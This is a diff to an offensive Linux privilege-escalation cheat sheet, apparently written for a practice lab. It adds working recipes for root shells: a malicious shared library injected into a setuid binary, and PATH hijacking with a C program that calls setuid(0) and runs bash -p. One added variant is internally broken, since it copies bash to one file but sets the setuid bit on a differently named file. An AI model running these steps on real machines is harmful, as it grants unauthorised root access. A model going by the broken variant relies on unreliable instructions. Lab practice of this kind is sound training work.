@@ -186,8 +186,8 @@ searchsploit <name app>
 ### Shared Object Injection ✡️
 ```bash
 file /usr/local/bin/suid-so # setuid setgid ELF 64-bit LSB executable
-strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
-mkdir /home/user/.config
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file" # Find a shared Object 
+mkdir /home/user/.config 
 nano /tmp/libcalc.c ⬇️⬇️⬇️⬇️
 -------------------
 #include <stdio.h>
@@ -201,13 +201,38 @@ void inject() {
 }
 -------------------
 gcc /tmp/libcalc.c -shared -fPIC -o /home/user/.config/libcalc.so
-
+/usr/local/bin/suid-so
 ```
 
-### Environment Variables ✡️
+### Environment Variables(1) ✡️
 ```bash
-
+/usr/local/bin/suid-env
+strings /usr/local/bin/suid-env # service apache2 start
+nano /tmp/service.c
+-------------------
+int main() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+-------------------
+gcc /tmp/service.c -o /tmp/service 
+export PATH=/tmp:$PATH
+/usr/local/bin/suid-env
 ```
+### Environment Variables(2) ✡️
+```bash
+/usr/local/bin/suid-env
+strings /usr/local/bin/suid-env # service apache2 start
+nano /tmp/service
+-------------------
+#!/bin/bash
+cp /bin/bash /tmp/rootshell
+chmod +s /tmp/mobin
+-------------------
+export PATH=/tmp:$PATH
+/usr/local/bin/suid-env
+```
+
 ### Abusing Shell Features (#1) ✡️
 ```bash
 
